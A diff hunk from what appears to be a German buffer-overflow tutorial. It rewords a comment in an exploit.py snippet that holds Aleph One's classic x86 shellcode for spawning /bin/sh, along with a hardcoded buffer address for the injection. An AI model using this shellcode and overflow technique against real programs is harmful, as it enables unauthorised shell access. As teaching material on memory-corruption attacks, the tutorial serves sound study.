@@ -78,7 +78,7 @@ Es entsteht zwar ein `Segmentation Fault` am Ende, doch vorher wurde die `verste
 Statt einfach nur 132 A's in die `buffer`-Variable zu schreiben lässt sich auf diese Weise auch weiterer Maschinencode in ein Programm einschleusen. Zur Generierung des Maschinencodes für die Öffnung einer Shell, lässt sich folgendes Python-Skript nutzen:
 `exploit.py`
 ``` python
-# Shellcode von Aleph One
+# Maschinencode zur Öffnung einer Shell von Aleph One
 sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 # Speicheradresse von buffer, little endian beachten
 buffer_addr = '\x8c\xf5\xff\xbf'
